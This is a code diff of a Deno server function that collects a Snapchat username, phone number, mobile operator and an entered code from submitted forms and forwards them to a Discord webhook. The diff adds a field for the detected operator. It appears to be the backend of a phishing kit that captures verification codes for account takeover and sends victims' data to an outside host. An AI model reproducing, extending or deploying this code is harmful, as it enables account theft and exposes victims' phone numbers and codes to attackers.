@@ -4,7 +4,7 @@ const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
   const base44 = createClientFromRequest(req);
-  const { snapchat, telephone, operateur, code, submissionId } = await req.json();
+  const { snapchat, telephone, operateur, code, submissionId, detectedOperator } = await req.json();
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
@@ -57,7 +57,8 @@ Deno.serve(async (req) => {
     color: operatorColors[operateur] || 16776960,
     fields: [
       { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
-      { name: "📡 Opérateur", value: operateur, inline: true },
+      { name: "📡 Opérateur sélectionné", value: operateur, inline: true },
+      { name: "✅ Opérateur détecté", value: detectedOperator || operateur, inline: true },
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🔢 Code entré", value: `**${code}**`, inline: true },
       { name: "🌍 Pays", value: country, inline: true },
